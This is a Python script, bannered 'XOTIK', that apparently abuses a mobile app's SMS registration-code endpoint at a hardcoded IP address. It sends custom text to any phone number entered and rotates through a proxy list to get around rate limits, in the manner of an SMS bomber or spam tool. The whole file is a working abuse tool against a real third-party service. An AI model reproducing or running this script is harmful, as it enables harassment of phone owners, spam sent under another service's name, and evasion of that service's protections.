import requests
import random
from pyfiglet import Figlet
from termcolor import colored

# Function to generate random color
def random_color():
    colors = ['red', 'green', 'yellow', 'blue', 'magenta', 'cyan', 'white']
    return random.choice(colors)

# Function to generate the banner with Figlet font and random color
def generate_banner(text):
    figlet = Figlet(font='standard')
    banner = figlet.renderText(text)
    color = random_color()
    colored_banner = colored(banner, color=color)
    return colored_banner

# Print the colored banner
print(generate_banner('XOTIK'))

# Define the target URL and headers
url = 'http://202.51.182.198:8181/nbp/sms/code'
headers = {
    'User-Agent': 'okhttp/3.11.0',
    'Connection': 'Keep-Alive',
    'Accept-Encoding': 'gzip',
    'Content-Type': 'application/json',
    'Authorization': 'Bearer YOUR_ACTUAL_TOKEN_HERE', 
    'language': 'en',
    'timeZone': 'Asia/Dhaka'
}

# Define the file containing proxy addresses
proxies_file = 'http_proxies.txt'

# Read proxies from file and prepend http:// if not already present
with open(proxies_file, 'r') as f:
    proxies_list = [line.strip() if line.startswith('http://') else 'http://' + line.strip() for line in f.readlines()]

# Function to send the request
def send_request(fast_number, custom_text, proxies_list):
    used_proxies = set()  # Set to keep track of used proxies
    max_attempts = 3  # Max attempts per proxy

    data = {
        'receiver': fast_number,
        'text': f'{custom_text}',
        'title': 'Register Account'
    }

    for _ in range(len(proxies_list)):  # Loop through all proxies at least once
        for proxy in proxies_list:
            if proxy in used_proxies:
                continue  # Skip already used proxies

            proxies = {
                'http': proxy,
                'https': proxy
            }

            try:
                response = requests.post(url, headers=headers, json=data, proxies=proxies, timeout=1)
                print(f'Using proxy: {proxy}')
                print('Status Code:', response.status_code)
                try:
                    print('Response JSON:', response.json())
                except ValueError:
                    print('Response Text:', response.text)

                used_proxies.add(proxy)  # Mark proxy as used
                break  # Break the loop if the request is successful
            except requests.exceptions.RequestException as e:
                print(f'Proxy {proxy} failed: {e}')

        if len(used_proxies) >= len(proxies_list):
            print("All proxies have been used. Exiting.")
            break

# Main loop
try:
    while True:
        fast_number = input('Enter the fast number (receiver number): ')
        custom_text = input('Enter the custom text ')
        send_request(fast_number, custom_text, proxies_list)
except KeyboardInterrupt:
    print("\nProcess stopped by user.")

